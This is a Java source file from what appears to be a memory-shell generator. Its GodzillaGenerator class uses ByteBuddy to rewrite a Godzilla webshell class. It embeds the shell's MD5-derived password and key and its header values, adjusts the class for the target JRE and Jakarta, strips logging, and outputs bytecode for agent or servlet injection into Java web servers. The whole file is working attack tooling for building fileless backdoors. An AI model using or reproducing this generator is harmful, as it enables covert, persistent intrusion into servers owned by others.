package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.Constants;
import com.reajason.javaweb.memshell.config.GodzillaConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.lang3.StringUtils;

import java.util.Map;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/23
 */
public class GodzillaGenerator {
    private final ShellConfig shellConfig;
    private final GodzillaConfig godzillaConfig;

    public GodzillaGenerator(ShellConfig shellConfig, GodzillaConfig godzillaConfig) {
        this.shellConfig = shellConfig;
        this.godzillaConfig = godzillaConfig;
    }

    public DynamicType.Builder<?> getBuilder() {
        if (godzillaConfig.getShellClass() == null) {
            throw new IllegalArgumentException("godzillaConfig.getClazz() == null");
        }
        if (StringUtils.isBlank(godzillaConfig.getKey()) || StringUtils.isBlank(godzillaConfig.getPass())) {
            throw new IllegalArgumentException("godzillaConfig.getKey().isBlank() || godzillaConfig.getPass().isBlank()");
        }
        String md5Key = DigestUtils.md5Hex(godzillaConfig.getKey()).substring(0, 16);
        String md5 = DigestUtils.md5Hex(godzillaConfig.getPass() + md5Key).toUpperCase();

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(godzillaConfig.getShellClass())
                .name(godzillaConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()));

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }

        if (shellConfig.getShellType().startsWith(Constants.AGENT)) {
            builder = builder.visit(
                    new LdcReAssignVisitorWrapper(Map.of(
                            "pass", godzillaConfig.getPass(),
                            "key", md5Key,
                            "md5", md5,
                            "headerName", godzillaConfig.getHeaderName(),
                            "headerValue", godzillaConfig.getHeaderValue()
                    ))
            );
        } else {
            builder = builder.field(named("pass")).value(godzillaConfig.getPass())
                    .field(named("key")).value(md5Key)
                    .field(named("md5")).value(md5)
                    .field(named("headerName")).value(godzillaConfig.getHeaderName())
                    .field(named("headerValue")).value(godzillaConfig.getHeaderValue());
        }
        return builder;
    }

    public byte[] getBytes() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return make.getBytes();
        }
    }
}